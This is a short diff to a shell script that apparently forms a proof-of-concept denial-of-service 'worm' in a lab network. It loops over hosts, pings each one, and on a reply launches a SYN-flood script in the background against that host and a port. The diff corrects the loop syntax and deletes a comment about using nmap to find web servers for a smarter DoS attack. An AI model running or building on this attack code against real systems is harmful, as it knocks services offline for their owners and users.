@@ -1,4 +1,4 @@
-while True: 
+while true; do 
 	if (( ping 210.0.0.101 -c 1 | grep -q 'from'))
 	then
 			echo "Bhost 1 found - ICMP attack"
@@ -21,7 +21,4 @@ while True:
 			sh syn-flood/flooder_simple.sh 210.0.0.104 1234 &
 	fi
 
-
-# sth like nmap -A -T 1 210.0.0.101 could be used and then grep http-server and launch the attck aginst the server port or so to show more of like intelligent dos worm like attack 
-
-# but the proof of concept shopwn now is good too 
+done
